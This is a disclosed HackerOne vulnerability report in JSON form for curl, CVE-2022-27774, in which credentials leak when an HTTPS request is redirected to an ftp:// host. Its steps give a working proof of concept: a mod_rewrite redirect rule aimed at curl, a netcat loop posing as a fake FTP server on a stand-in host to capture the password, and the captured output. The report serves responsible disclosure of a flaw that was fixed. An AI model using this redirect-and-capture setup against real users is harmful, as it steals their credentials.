{
  "id": 1543773,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTQzNzcz",
  "url": "https://hackerone.com/reports/1543773",
  "title": "CVE-2022-27774: Credential leak on redirect",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2022-04-18T19:36:47.046Z",
  "submitted_at": "2022-04-18T19:36:47.127Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "nyymi",
    "url": "/nyymi",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 35663,
    "url": "https://hackerone.com/curl",
    "handle": "curl",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "curl",
      "twitter_handle": "",
      "website": "https://curl.se",
      "about": "cURL is an Open Source project providing a library and command-line tool for doing internet transfers"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2022-27774"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2022-04-27T09:58:04.386Z",
  "bug_reporter_agreed_on_going_public_at": "2022-04-27T09:55:13.678Z",
  "team_member_agreed_on_going_public_at": "2022-04-27T09:58:04.211Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nCurl can be coaxed to leak user credentials to third-party host by issuing HTTP redirect to ftp:// URL.\n\n## Steps To Reproduce:\n\n  1. Configure for example Apache2 on `firstsite.tld` to perform redirect with mod_rewrite:\n     ```\n    RewriteCond %{HTTP_USER_AGENT} \"^curl/\"\n    RewriteRule ^/redirectpoc ftp://secondsite.tld:9999 [R=301,L]\n     ```\n  2. Capture credentials at `secondsite.tld` for example with:\n     ```\n     while true; do echo -e \"220 pocftp\\n331 plz\\n530 bye\" | nc -v -l -p 9999; done\n     ```\n  3. `curl -L --user foo  https://firstsite.tld/redirectpoc`\n  4. The entered password is visible in the fake FTP server:\n```\nListening on 0.0.0.0 9999\nConnection received on somehost someport\nUSER foo\nPASS secretpassword\n```\n\nThere are several issues here:\n1. The credentials are sent to a completely different host than the original host (`firstsite.tld` vs `secondsite.tld`). This is definitely not what the user could expect, considering the documentation says:\n> When authentication is used, curl only sends its credentials to the initial host. If a redirect takes curl to a different host, it will not be able to intercept the user+password. See also --location-trusted on how to change this.\n2. The redirect crosses from secure context (HTTPS) to insecure one (FTP). That is the credentials are unexpectedly sent over insecure channels even when the URL specified is using HTTPS.\n\nI believe the credentials should not be sent in this case unless if `--location-trusted` is used.\n\nIt might even be sensible to consider making curl stop sending credentials over downgraded security by default even when `--location-trusted` is used. Maybe there could be some option that could be used to enable such downgrade if the user REALLY wants it.\n\n## Impact\n\nLeak of confidential information (user credentials).",
  "weakness": {
    "id": 87,
    "name": "Insufficiently Protected Credentials"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2022-05-27T09:55:13.750Z",
  "allow_singular_disclosure_after": -54188964.762235664,
  "singular_disclosure_allowed": true,
  "vote_count": 6,
  "voters": [
    "tgadams",
    "zy9ard3",
    "shivammusic",
    "norwegianguy",
    "maj0r",
    "deensec"
  ],
  "severity": {
    "rating": "high",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 18844,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/curl/curl",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
